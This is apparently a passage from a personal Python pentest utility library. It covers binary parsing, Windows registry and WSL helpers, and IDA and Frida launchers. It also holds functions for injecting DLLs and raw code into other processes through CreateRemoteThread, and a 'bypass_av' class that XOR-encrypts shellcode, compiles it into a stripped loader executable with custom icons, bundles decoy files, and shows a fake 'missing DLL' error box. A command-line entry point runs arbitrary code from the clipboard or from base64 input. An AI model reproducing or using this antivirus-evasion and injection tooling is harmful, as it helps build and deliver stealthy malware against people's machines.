            ]
            return '\n'.join(inf_data)

    if type(exe_obj)==str:
        if isfile(exe_obj):
            if has_ch(exe_obj):
                exe_obj = parse(rd(exe_obj))
            else:
                exe_obj = parse(exe_obj)
    elif type(exe_obj)==bytes:
        exe_obj = parse(exe_obj)
            
    if type(exe_obj)==lief.PE.Binary:
        return pe(exe_obj)
    elif type(exe_obj)==lief.ELF.Binary:
        return elf(exe_obj)

def dlib(exe_obj):
    return exe(exe_obj).dlib
    
def ispe(pe_path):
    return 'exe.<locals>.pe' in str(exe(pe_path))
        
def iself(elf_path):
    return 'exe.<locals>.elf' in str(exe(elf_path))

#--------------------------------------------------------------------------------
# win- windows utils

def werr(x):
    return WinError(x)
    
class at(object):
    def __init__(self, pid):
        self.kernel32 = wdl('kernel32.dll')
        self.OpenProcess = self.kernel32.OpenProcess
        self.CloseHandle = self.kernel32.CloseHandle
        self.GetLastError = self.kernel32.GetLastError
        self.ReadProcessMemory = self.kernel32.ReadProcessMemory
        self.ReadProcessMemory.restype = c_bool
        self.WriteProcessMemory = self.kernel32.WriteProcessMemory
        self.WriteProcessMemory.restype = c_bool
        self.VirtualProtectEx = self.kernel32.VirtualProtectEx
        self.VirtualProtectEx.restype = c_bool
        self.VirtualAllocEx = self.kernel32.VirtualAllocEx
        self.VirtualAllocEx.restype = c_void_p
        self.VirtualFreeEx = self.kernel32.VirtualFreeEx
        self.VirtualFreeEx.restype = c_bool
        self.CreateRemoteThread = self.kernel32.CreateRemoteThread
        self.CreateRemoteThread.restype = c_void_p

        self.h_proc = self.OpenProcess(0x1f0fff, False, pid)
        if not self.h_proc:
            raise ValueError('OpenProcess: {}'.format(werr(self.GetLastError())))
        
    def __del__(self):
        if not self.CloseHandle(self.h_proc):
            raise ValueError('CloseHandle: {}'.format(werr(self.GetLastError())))
        
    def rdm(self, mem_addr, size):
        out_buf = (c_char*size)()
        if not self.ReadProcessMemory(c_void_p(self.h_proc), c_void_p(mem_addr), byref(out_buf), c_size_t(size), c_void_p(0)):
            raise ValueError('ReadProcessMemory: {}'.format(werr(self.GetLastError())))
        return out_buf.raw
        
    def wtm(self, mem_addr, data):
        size = len(data)
        in_buf = (c_char*size)()
        in_buf.raw = data
        if not self.WriteProcessMemory(c_void_p(self.h_proc), c_void_p(mem_addr), byref(in_buf), c_size_t(size), c_void_p(0)):
            raise ValueError('WriteProcessMemory: {}'.format(werr(self.GetLastError())))
        
    def vprot_(self, mem_addr, page_cnt, prot):
        mem_addr = mem_addr & ~0xfff
        size = page_cnt*0x1000
        old_prot = c_ulong()
        if not self.VirtualProtectEx(c_void_p(self.h_proc), c_void_p(mem_addr), c_size_t(size), c_ulong(prot), byref(old_prot)):
            raise ValueError('VirtualProtectEx: {}'.format(werr(self.GetLastError())))
        else:
            return old_prot.value
    
    def n(self, mem_addr, page_cnt=1):
        return self.vprot_(mem_addr, page_cnt, 0x1)
    def r(self, mem_addr, page_cnt=1):
        return self.vprot_(mem_addr, page_cnt, 0x2)
    def x(self, mem_addr, page_cnt=1):
        return self.vprot_(mem_addr, page_cnt, 0x10)
    def rw(self, mem_addr, page_cnt=1):
        return self.vprot_(mem_addr, page_cnt, 0x4)
    def rx(self, mem_addr, page_cnt=1):
        return self.vprot_(mem_addr, page_cnt, 0x20)
    def rwx(self, mem_addr, page_cnt=1):
        return self.vprot_(mem_addr, page_cnt, 0x40)
    
    def alloc(self, size):
        mem_addr = self.VirtualAllocEx(c_void_p(self.h_proc), 0, c_size_t(size), c_ulong(0x1000|0x2000), 0x40)
        if not mem_addr:
            raise ValueError('VirtualAllocEx: {}'.format(werr(self.GetLastError())))
        else:
            return mem_addr
    
    def free(self, mem_addr):
        if not self.VirtualFreeEx(c_void_p(self.h_proc), c_void_p(mem_addr), c_size_t(0), c_ulong(0x8000)):
            raise ValueError('VirtualFreeEx: {}'.format(werr(self.GetLastError())))
        else:
            return True
    
    def crt(self, mem_addr, param=0):
        tid = c_ulong()
        ret = self.CreateRemoteThread(c_void_p(self.h_proc), c_void_p(0), c_size_t(0), c_void_p(mem_addr), c_void_p(param), c_ulong(0), byref(tid))
        if not ret:
            raise ValueError('CreateRemoteThread: {}'.format(werr(self.GetLastError())))
        else:
            return tid.value
            
    def dll_inject(self, dll_path):
        dll_path_utf_16 = dll_path.encode('utf-16')[2:]
        dll_path_addr = self.alloc(len(dll_path_utf_16)+2)
        self.wtm(dll_path_addr, dll_path_utf_16)
        self.crt(wea('kernel32.dll', 'LoadLibraryW'), dll_path_addr)
        
    def code_inject(self, code_data):
        code_addr = self.alloc(len(code_data))
        self.wtm(code_addr, code_data)
        self.crt(code_addr)
        return code_addr

def wsym(mod_func):
    if '.' not in mod_func:
        return eval('windll.{}._handle'.format(mod_func))
    else:
        return eval('cast(windll.{}, c_void_p).value'.format(mod_func))

sys_dll_set = set()
def smod(name):
    global sys_dll_set
    try:
        if not sys_dll_set:
            sys_dll_set = set(nem(rd('@@@sys_mod@@@', 'r').replace('\r', '').split('\n')))
    except:
        system64 = glob(r'C:\WINDOWS\system32\**\*dll')+glob(r'C:\WINDOWS\system32\**\*exe')+glob(r'C:\WINDOWS\system32\**\*drv')
        system32 = glob(r'C:\WINDOWS\SysWOW64\**\*dll')+glob(r'C:\WINDOWS\SysWOW64\**\*exe')+glob(r'C:\WINDOWS\SysWOW64\**\*drv')
        sys_dll_set = set(map(lambda path:basename(path).lower(), system64+system32))
        wt('@@@sys_mod@@@', 'w')(en(sys_dll_set))
        
    if name.lower() in sys_dll_set:
        return True
    else:
        return False

def kdll(name):
    knows = [i[1] for i in reg(r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs').val]
    
    for i in knows:
        if name.lower()==i.lower():
            return True
    return False

def wc(data):
    import win32con
    x_lst = data.split('\n')
    x_lst = list(filter(lambda x:x, x_lst))
    x_lst = list(map(lambda x:x.strip(), x_lst))
    
    ret = []
    
    for x in x_lst:
        try:
            ret.append('{} = '.format(x.strip()) + hex(eval("win32con.{}".format(x.strip()))))
        except:
            pass
    return en(ret)
    
def pwc():
    import win32con
    return wc(en(dir(win32con)))
    
class reg(object):
    def __init__(self, key_path):
        import winreg
        self.winreg = winreg
        try:
            self.key_path = key_path.split('\\')
            self.key_handle = self.winreg.OpenKeyEx(eval('self.winreg.{}'.format(self.key_path[0])), pin(*self.key_path[1:]) if self.key_path[1:] else None)
            self.subkey_cnt, self.val_cnt, tmp = self.winreg.QueryInfoKey(self.key_handle)
        except:
            self.key_path = None
            self.key_handle = None
            self.subkey_cnt, self.val_cnt = None, None
            
    def __del__(self):
        if self.key_handle:
            self.winreg.CloseKey(self.key_handle)
        return
        
    def _ud(self, key_path):
        if self.key_handle:
            self.winreg.CloseKey(self.key_handle)
        self.__init__(key_path)
        return self
    
    @property
    def val(self):
        vals = []
        if self.key_handle:
            vals.extend([self.winreg.EnumValue(self.key_handle, i) for i in range(self.val_cnt)])
        return vals
    
    @property
    def key(self):
        keys = []
        if self.key_handle:
            keys.extend([self.winreg.EnumKey(self.key_handle, i) for i in range(self.subkey_cnt)])
        return keys
    
    def fd(self, pattern, resolve=[]):
        resolve.extend([(pin(*self.key_path), i[0]) for i in filter(lambda item:pattern.lower() in str(item).lower(), self.val)])
        tmp_key_path = self.key_path
        for i in self.key:
            self._ud(pin(*tmp_key_path, i))
            self.fd(pattern, resolve)
            self._ud(pin(*tmp_key_path))
        return resolve
        
    def f(self, pattern):
        return en([i[0]+' => '+i[1] for i in self.fd(pattern)])
#-------------------------------------------------------------------------------- 
# wsl-

def wcx(x):
    win_pattern = r'^[a-zA-Z]:(?:[\\/][^\\/\n\r:\*"<>\|\?]+)*'
    lix_pattern = r'^/mnt(?:/[^/\n\r]+)+'
    url_pattern = r'^https?:/(?:/[^/\s]+)+'

    win = []
    lix = []
    url = []
    
    for i in x.split('\n'):
        if match(win_pattern, i.strip()):
           win.append(i.strip().rstrip('\\/'))
        elif match(lix_pattern, i.strip()):
           lix.append(i.strip())
        elif match(url_pattern, i.strip()):
           url.append(i.strip())
           
    lix = list(map(lambda tmp_lix:gsub(r'/mnt/([a-zA-Z])', lambda x:x.group(1).upper()+':', tmp_lix).replace('/', '\\').strip(), lix))
    win = list(map(lambda tmp_win:tmp_win.strip(), win))
    return sorted(filter(lambda x:x, win + lix + url))
    
fl = wcx
    
def lcx(x):
    win_pattern = r'^[a-zA-Z]:(?:[\\/][^\\/\n\r:\*"<>\|\?]+)*'
    lix_pattern = r'^/mnt(?:/[^/\n\r]+)+'
    url_pattern = r'^https?:/(?:/[^/\s]+)+'
    
    win = []
    lix = []
    url = []
    
    for i in x.split('\n'):
        if match(win_pattern, i.strip()):
           win.append(i.strip().rstrip('\\/'))
        elif match(lix_pattern, i.strip()):
           lix.append(i.strip())
        elif match(url_pattern, i.strip()):
           url.append(i.strip())

    win = list(map(lambda tmp_win:gsub(r'([a-zA-Z]):', lambda x:'\\mnt\\'+x.group(1).lower(), tmp_win).replace('\\', '/').strip(), win))
    lix = list(map(lambda tmp_lix:tmp_lix.strip(), lix))
    return sorted(set(filter(lambda x:x, win + lix + url)))
    
def wsl(wsl_name):
    wsl_map = {
        'ub1':'ubuntu_1',
        'ub2':'ubuntu_2',
        'ka':'kali-linux'
    }
    if wsl_name in wsl_map:
        wsl_name = wsl_map[wsl_name]
    pp('wsl.exe', '--set-default', wsl_name)()

class wsx(object):
    def __init__(self, shell=True):
        self.data = b''
        self.shell = shell
        self.cmd = []
    
    def __call__(self, *args):
        if self.cmd:
            self.cmd.append('|')
        self.cmd.append('wsl.exe')
        self.cmd.extend(args)
        return self
        
    @property
    def val(self):
        if is_plat('win'):
            self.data = pp(*self.cmd)(self.data, shell=self.shell)
        else:
            self.data = pp(' '.join(self.cmd))(self.data, shell=self.shell)
        return self.data
        
    @val.setter
    def val(self, data):
        self.data = data
        
wsx = wsx()

def mutate(payload, FUZZ_FACTOR=100):
    if random.random() < FUZZ_FACTOR / 100:
        return pp('wsl.exe', 'radamsa', '-n', '1')(payload)
    else:
        return payload
        
# lix-
def grep(*regxs):
    ext_str = ''
    base_str = ''
    
    for i in regxs:
        if type(i)==str:
            ext_str += r''' | xargs -r -d '\n' egrep -i -r -l "{}" '''.format(i)
        else:
            ext_str += r''' | xargs -r -d '\n' egrep -i -r -L "{}" '''.format(i.decode())
        
    def name_filter(name_regx=''):
        base_str = 'find "$(pwd)" -type f | egrep -i "{}"'.format(name_regx)
        return base_str + ext_str
    return name_filter

def echo(data=''):
    return r"echo -e '\n{}'".format(data)
#-------------------------------------------------------------------------------- 
# frida- fa-

def fa_cli(cmd, frida_js_content=''):
    set_python_path(r'D:\tools\bin\Lib\frida')
    from frida_bind import fa
    
    frida_js_name = gsub(r'[\\/\n\r:\*"<>\|\? ]', r'_', str(cmd).strip())+'.js'
    frida_js_path = pin(r'D:\tools\bin\Lib\frida', frida_js_name)
    if frida_js_name=='frida.js':
        return
    Thread(target=lambda:fa.cli(cmd, frida_js_name, frida_js_content)).start()
    while not exist(frida_js_path):
        pass
    pp(r'%SCOOP%\apps\notepadplusplus\current\notepad++.exe', frida_js_path)()
#--------------------------------------------------------------------------------
# bav- pentest-

def svg2ico(svg_data):
    rm('@@@svg2ico@@@')
    md('@@@svg2ico@@@')
    cd('@@@svg2ico@@@')
    wt('icon.svg')(svg_data)
    cmds = [
        ['inkscape', '-w', '16', '-h', '16', '-o', '16.png', 'icon.svg'],
        ['inkscape', '-w', '32', '-h', '32', '-o', '32.png', 'icon.svg'],
        ['inkscape', '-w', '48', '-h', '48', '-o', '48.png', 'icon.svg'],
        ['%SCOOP%\\apps\\imagemagick\\current\\convert.exe', '16.png', '32.png', '48.png', 'icon.ico']
    ]
    cmd_exec(cmds)
    data = rd('icon.ico')
    cd('..')
    rm('@@@svg2ico@@@')
    return data

class split_file_upload(object):
    def __init__(self, exp, block_size=1024):
        self.exp = exp
        self.block_size = block_size
        
    def upload(self, src_file_name):
        fs = bio(e64(rd(src_file_name)))
        data = fs.read(self.block_size)
        while data:
            exp(data.decode())
            data = fs.read(self.block_size)

sfu = split_file_upload
            
class bypass_av(object):
    src = None
    
    @staticmethod
    def gen(src, icon=None, gui=False, libs=None, cmds=None):
        src = gsub('@@@slot.*@@@', '', src)
        rm('@@@bypass_av@@@')
        md('@@@bypass_av@@@')
        cd('@@@bypass_av@@@')
        wt('shell.cpp', 'w')(src)
        
        if icon:
            wt('shell.ico')(icon)
            wt('icon.rc', 'w')('id ICON "shell.ico"')
            cmd_exec([
                ['windres.exe', '-i', 'icon.rc', '-o', 'icon.o']
            ])
            
        if not libs:
            libs = []
        else:
            libs = ['-l'+i for i in libs]
        
        if not cmds:
            if icon:
                cmds = [
                    ['g++.exe', '-static', 'shell.cpp', 'icon.o'] + libs + ['-o', 'shell.exe'],
                    ['strip.exe', 'shell.exe']
                ]
            else:
                cmds = [
                    ['g++.exe', '-static', 'shell.cpp'] + libs + ['-o', 'shell.exe'],
                    ['strip.exe', 'shell.exe']
                ]
        
        cmd_exec(cmds)
        
        if gui:
            bav.gui('shell.exe')
        exe_data = rd('shell.exe')
        cd('..')
        rm('@@@bypass_av@@@')
        return exe_data
        
    @staticmethod
    def bytes_to_c_buf(data, name=None):
        ret = str(list(data)).strip('[').strip(']').join(['{', '}'])
        if name:
            ret = 'unsigned char {}[{}] = '.format(name, len(data)) + ret
        return ret
        
    b2cb = bytes_to_c_buf
    
    @staticmethod
    def bytes_to_c_str(data, name=None):
        ret = fm(data.hex(), r'\x').join(['"', '"'])
        if name:
            ret = 'unsigned char {}[{}] = '.format(name, len(data)) + ret
        return ret
        
    b2cs = bytes_to_c_str
    
    @staticmethod
    def pack(*slots):
        return p32(0)+b''.join([slot+p32(len(slot)) for slot in slots])
        
    @staticmethod
    def unpack(data):
        bs = bio(data[::-1])
        slots = []
        slot_size = u32(bs.read(4)[::-1])
        while slot_size:
            slots.append(bs.read(slot_size)[::-1])
            slot_size = u32(bs.read(4)[::-1])
        return slots[::-1]
        
    @staticmethod
    def single_exe(sc, icon=None, gui=False, sleep=2000, modify=None, libs=None):
        if not bav.src:
            src = rd(r'D:\tools\bin\Lib\file_templete\bypass_av_single_exe.cpp', 'r')
        else:
            src = bav.src
            
        if modify:
            src = modify(src)
            
        sc_key = rand_bytes(rand_int(16, 32))
        sc = exor(sc, sc_key)
            
        # decode shellcode at slot_1
        slot_1 = r'decode(p_sc, sc_size, {}, {});'.format(bav.b2cs(sc_key), str(len(sc_key)))
        
        src = src.replace('@@@slot_0@@@', str(sleep))
        src = src.replace('@@@slot_1@@@', slot_1)
        src = src.replace('@@@slot_3@@@', str(rand_int(0, 0x1000)))
        src = src.replace('@@@slot_4@@@', 'NULL')
        
        if not libs:
            libs=['shlwapi']
        else:
            libs=['shlwapi']+libs
        wt('@@@cc_shell_src@@@', 'w')(src)
        return bav.gen(src, icon, gui, libs)+bav.pack(sc)
    
    se = single_exe
    
    @staticmethod
    def single_exe_seperate(sc, icon=None, gui=False, db_name='config.db', sleep=2000, modify=None, libs=None):
        def modify_(src):
            if modify:
                src = modify(src)
            src = src.replace('@@@slot_4@@@', 'L"{}"'.format(db_name))
            return src
        pe_data = bav.single_exe(sc, icon, gui, sleep, modify_, libs)
        sc_data = bav.pack(bav.unpack(pe_data)[0])
        pe_data = pe_data[0:len(pe_data)-len(sc_data)]
        wtz('@@@bav_sex@@@')('shell.exe', pe_data)(db_name, sc_data)
        zip_data = rd('@@@bav_sex@@@')
        rm('@@@bav_sex@@@')
        return zip_data
        
    sex = single_exe_seperate
    
    @staticmethod
    def extract_and_exec_file_from_single_exe(sc, icon=None, gui=False, file_tuple=None, sleep=2000, modify=None, libs=None):
        if not file_tuple:
            return bav.single_exe(sc, icon, gui, sleep, modify, libs)
            
        file_bytes, file_ext_name = file_tuple[0], file_tuple[1]
        file_key = rand_bytes(rand_int(16, 32))
        file_bytes = exor(file_bytes, file_key)
        
        slot_2 = dtxt(b'H4sIAMukIGMC/3MJ9w9yUUjLzEmNL86sSlWwVShKTUyJhwjk5Jdo+IX6+OgoGOoogBia1rxcAWH+nlAdKYkliUAdiTk5+ckacDNAinAZAtcGUgQAPLLE+nwAAAA=')
        slot_2 += r'decode(file_data, file_size, {}, {});'.format(bav.b2cs(file_key), str(len(file_key))) + '\n'
        slot_2 += r'write_temp_file_and_exec((unsigned char *)file_data, file_size, L"{}");'.format(file_ext_name) + '\n'
        def modify_(src):
            if modify:
                src = modify(src)
            src = src.replace('@@@slot_2@@@', slot_2)
            return src
        
        return bav.single_exe(sc, icon, gui, sleep, modify_, libs)+file_bytes+p32(len(file_bytes))
        
    se_file = extract_and_exec_file_from_single_exe
    
    @staticmethod
    def single_exe_with_msgbox(sc, icon=None, gui=False, msg_tuple=None, sleep=2000, modify=None, libs=None):
        if not msg_tuple:
            msg_tuple = [b'\xe7\xb3\xbb\xe7\xbb\x9f\xe9\x94\x99\xe8\xaf\xaf'.decode(), b'\xe7\x94\xb1\xe4\xba\x8e\xe6\x89\xbe\xe4\xb8\x8d\xe5\x88\xb0api-ms-win-core-delayload-l1-1-0.dll, \xe6\x97\xa0\xe6\xb3\x95\xe7\xbb\xa7\xe7\xbb\xad\xe6\x89\xa7\xe8\xa1\x8c\xe4\xbb\xa3\xe7\xa0\x81, \xe9\x87\x8d\xe6\x96\xb0\xe5\xae\x89\xe8\xa3\x85\xe7\xa8\x8b\xe5\xba\x8f\xe5\x8f\xaf\xe8\x83\xbd\xe4\xbc\x9a\xe8\xa7\xa3\xe5\x86\xb3\xe6\xad\xa4\xe9\x97\xae\xe9\xa2\x98\xe3\x80\x82'.decode()]
        slot_2 = rf'MessageBoxW(NULL, L"{msg_tuple[1]}", L"{msg_tuple[0]}", MB_ICONERROR|MB_OK);'
        def modify_(src):
            if modify:
                src = modify(src)
            src = src.replace('@@@slot_2@@@', slot_2)
            return src
        
        return bav.single_exe(sc, icon, gui, sleep, modify_, libs)
        
    se_msg = single_exe_with_msgbox
    
    @staticmethod
    def gui(path):
        pe_obj = exe(path)
        pe_obj.subsystem('gui')
        pe_obj.dump(path)

    @staticmethod
    def cui(path):
        pe_obj = exe(path)
        pe_obj.subsystem('cui')
        pe_obj.dump(path)
    
    @staticmethod
    def pe2sc(pe_data):
        if exe(pe_data).isexe:
            pe_path = r'@@@shell@@@.exe'
        elif exe(pe_data).isdll:
            pe_path = r'@@@shell@@@.dll'
        else:
            return b''
    
        bin_path = r'@@@shell@@@.bin'
    
        wt(pe_path)(pe_data)
        pp('donut.exe', '-f', pe_path, '-o', bin_path)()
        pe_data = rd(bin_path)
        rm(pe_path)
        rm(bin_path)
        return pe_data

bav = bypass_av
pe2sc = bav.pe2sc
#--------------------------------------------------------------------------------
# ida-

def ida_single(target, script=r'D:\tools\bin\Lib\ida\analysis.idc'):
    if target.strip().endswith('.idb'):
        pp(r'D:\tools\re\IDA\IDA7.5\ida.exe', '-A', '-S"{}"'.format(script), '{}'.format(target))()
        return
    if target.strip().endswith('.i64'):
        pp(r'D:\tools\re\IDA\IDA7.5\ida64.exe', '-A', '-S"{}"'.format(script), '{}'.format(target))()
        return
    if exe(target).is32:
        pp(r'D:\tools\re\IDA\IDA7.5\ida.exe', '-A', '-S"{}"'.format(script), '{}'.format(target))()
        return
    if exe(target).is64:
        pp(r'D:\tools\re\IDA\IDA7.5\ida64.exe', '-A', '-S"{}"'.format(script), '{}'.format(target))()
        return

def ida(target_list, script=r'D:\tools\bin\Lib\ida\analysis.idc'):
    p = Pool(8)
    for i in target_list:
        p.apply_async(ida_single, args=(i, script))
    p.close()
    p.join()
    
ida_bex = lambda target_list: ida(target_list, r'D:\tools\bin\Lib\ida\BinExport.idc')
#-------------------------------------------------------------------------------- 
# main-

import argparse

if __name__=='__main__':
    args = xtargs()
    args = args.add_mutex_flag('-c', 'exec code from clipboard')
    args = args.add_mutex_flag('-x', 'exec code from stdin')
    args = args.add_mutex_val('-b', 'exec base64 code from param', '<base64_code>')
    args = args.add_mutex_val('-p', 'exec base64 code from file', '<file_path>')
    args = args.add_mutex_val('-f', 'text filter', '[line neg_line block neg_block]')
    args = args.add_val('-i', 'stdin encoding', '[utf-8 utf-16 gbk]')
    args = args.add_val('-o', 'stdout encoding', '[utf-8 utf-16 gbk]')
    args = args.add_val('-e', 'eval expr, set value to clipboard or stdout', '[clip stdout]')
    args = args.add_flag('-d', 'dispatch code')
    args = args.val
    
    if args.i:
        sys.stdin.reconfigure(encoding=args.i)
    if args.o:
        sys.stdout.reconfigure(encoding=args.o)
        
    if args.f:
        if args.f=='line':
            set_clip(line_filter(rd(r'@@@line_filter_pattern@@@', 'r').replace('\r', ''), get_clip()))
        elif args.f=='neg_line':
            set_clip(neg_line_filter(rd(r'@@@neg_line_filter_pattern@@@', 'r').replace('\r', ''), get_clip()))
        elif args.f=='block':
            set_clip(block_filter(rd(r'@@@block_filter_pattern@@@', 'r').replace('\r', ''), get_clip()))
        elif args.f=='neg_block':
            set_clip(neg_block_filter(rd(r'@@@neg_block_filter_pattern@@@', 'r').replace('\r', ''), get_clip()))

    src_code = ''
    
    if args.c:
        src_code = get_clip().strip('\x00')
        
    if args.x:
        src_code = sys.stdin.read().strip('\x00')
        
    if args.b:
        src_code = d64(args.b.encode()).decode().strip('\x00')
        
    if args.p:
        if exist(args.p):
            src_code = d64(rd(args.p)).decode().strip('\x00')
        
    if args.e:
        eval_result = str(eval(src_code))
        if args.e=='clip':
            set_clip(eval_result)
        if args.e=='stdout':
            print(eval_result)
    else:
        if args.d:
            xt.dispatch(src_code)
        else:
            exec(src_code)
#--------------------------------------------------------------------------------